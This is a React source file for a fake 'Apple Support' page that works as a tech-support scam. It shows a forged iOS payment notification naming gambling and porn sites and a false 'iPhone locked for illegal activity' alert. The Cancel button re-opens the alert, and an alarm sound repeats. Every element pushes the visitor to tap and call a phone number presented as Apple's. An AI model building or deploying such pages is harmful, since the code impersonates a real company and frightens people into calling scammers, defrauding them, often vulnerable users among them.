import React, { useState, useEffect, useRef } from 'react';
import './App.css';

function App() {
  const [showNotification, setShowNotification] = useState(false);
  const [showAlert, setShowAlert] = useState(false);
  const audioRef = useRef(null);

  const phoneNumber = '+1(888)339-6578';

  const playSound = () => {
    if (audioRef.current) {
      audioRef.current.currentTime = 0;
      audioRef.current.play().catch(e => console.log('Audio play prevented', e));
    }
  };

  const triggerNotification = () => {
    setShowNotification(false);
    setTimeout(() => {
      setShowNotification(true);
      playSound();
    }, 600);
  };

  useEffect(() => {
    const initialTimer = setTimeout(() => {
      triggerNotification();
      setShowAlert(true);
    }, 100);

    const interval = setInterval(triggerNotification, 8000);

    const unlockAudio = () => {
      if (audioRef.current && audioRef.current.paused) {
        audioRef.current.play().catch(() => {});
      }
      document.body.removeEventListener('click', unlockAudio);
    };
    document.body.addEventListener('click', unlockAudio);

    return () => {
      clearTimeout(initialTimer);
      clearInterval(interval);
      document.body.removeEventListener('click', unlockAudio);
    };
  }, []);

  const handleCall = () => {
    window.location.href = `tel:${phoneNumber.replace(/[^0-9+]/g, '')}`;
  };

  const handleCancelAlert = () => {
    setShowAlert(false);
    setTimeout(() => {
      setShowAlert(true);
    }, 50);
  };

  return (
    <div className="App">
      <audio ref={audioRef} id="notification-sound" src="/ualert.mpeg" preload="auto"></audio>

      <div 
        id="ios-notification-container" 
        className={showNotification ? 'show' : ''} 
        onClick={handleCall}
        style={{ cursor: 'pointer' }}
      >
        <div className="ios-notification-header">
          <div className="ios-notification-header-left">
            <div className="ios-app-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="16" height="16">
                <rect width="100" height="100" rx="22" fill="#34C759"></rect>
                <path d="M50 22C28 22 12 36 12 53C12 63 18 72 27 77C27 77 26 86 19 91C19 91 34 91 43 80C45 80.5 48 81 50 81C72 81 88 67 88 53C88 36 72 22 50 22Z" fill="#FFF"></path>
              </svg>
            </div>
            <span className="ios-app-name">MESSAGES</span>
          </div>
          <div className="ios-notification-header-right">
            <span className="ios-time">now</span>
          </div>
        </div>
        <div className="ios-notification-body">
          <div className="ios-notification-content">
            <div className="ios-notification-title">Payment Successful</div>
            <div className="ios-notification-text">
              <span>Sent $ 348.72 via Online Transaction to <u>Betonline.net</u> & <u>pornhub.net</u> . Not you? Call {phoneNumber}</span>
            </div>
          </div>
        </div>
      </div>

      <div id="ios-alert-overlay" className={showAlert ? 'show' : ''}>
        <div id="ios-alert-box">
          <div className="ios-alert-message">
            Your iPhone has been locked due to detected illegal activity. Your Apple Account has been disabled! Immediately call Apple Support {phoneNumber} to unlock it!
          </div>
          <div className="ios-alert-buttons-row">
            <button className="ios-alert-btn-row cancel" onClick={handleCancelAlert}>Cancel</button>
            <button className="ios-alert-btn-row ok" onClick={handleCall}>OK</button>
          </div>
        </div>
      </div>

      {/* Restored Original Layout */}
      <nav id="ac-globalnav" className="no-js">
        <div className="ac-gn-content">
          <ul className="ac-gn-header">
             <li className="ac-gn-item ac-gn-apple">
                <a className="ac-gn-link" href="#" style={{color: '#fff', textDecoration: 'none'}}>Apple</a>
             </li>
          </ul>
        </div>
      </nav>

      <div className="main">
        <nav id="ac-localnav" className="js no-touch css-sticky">
            <div className="ac-ln-wrapper">
                <div className="ac-ln-content">
                    <span className="ac-ln-title">
                        <a href="#">Apple Support <span style={{color: 'red'}}>{phoneNumber}</span></a>
                    </span>
                </div>
            </div>
        </nav>
        <section className="as-columns as-columns--1up as-banner as-banner--top">
            <div className="row">
                <div className="column large-12 medium-12 small-12">
                    <div className="as-banner-cont">
                        <div className="as-banner-image as-banner-image--top">
                            <img 
                                sizes="(min-width:735px ) 735w, 100vw" 
                                srcSet="/images/contact-us-hero.image.small_2x.jpg 735w, /images/contact-us-hero.image.large_2x.jpg 1440w" 
                                alt="" 
                                src="/images/contact-us-hero.image.large_2x.jpg" 
                                style={{width: '100%', height: 'auto', display: 'block'}}
                            />
                        </div>
                    </div>
                    <div className="as-banner-content" style={{textAlign: 'center', padding: '40px 20px'}}>
                        <div className="pageTitle">
                            <h1 className="pageTitle-heading" style={{fontSize: '48px', fontWeight: '600'}}>Apple Support</h1>
                        </div>
                    </div>
                </div>
            </div>
        </section>
      </div>

      <footer id="ac-globalfooter" className="no-js" style={{background: '#f5f5f7', padding: '20px', fontSize: '12px', color: '#888'}}>
        <div className="ac-gf-content">
            <section className="ac-gf-footer">
                <div className="ac-gf-footer-shop" style={{borderBottom: '1px solid #d2d2d7', paddingBottom: '10px', marginBottom: '10px'}}>
                    More ways to: Visit an <a href="#">Apple Store</a>, call {phoneNumber}, or <a href="#">find a reseller</a>.
                </div>
                <div className="ac-gf-footer-legal" style={{display: 'flex', justifyContent: 'space-between'}}>
                    <div className="ac-gf-footer-legal-copyright">Copyright © 2026 Apple Inc. All rights reserved.</div>
                    <div className="ac-gf-footer-legal-links">
                        <a href="#" style={{marginRight: '10px', color: '#555', textDecoration: 'none'}}>Privacy Policy</a>
                        <a href="#" style={{marginRight: '10px', color: '#555', textDecoration: 'none'}}>Terms of Use</a>
                        <a href="#" style={{color: '#555', textDecoration: 'none'}}>Sales and Refunds</a>
                    </div>
                </div>
            </section>
        </div>
      </footer>
    </div>
  );
}

export default App;
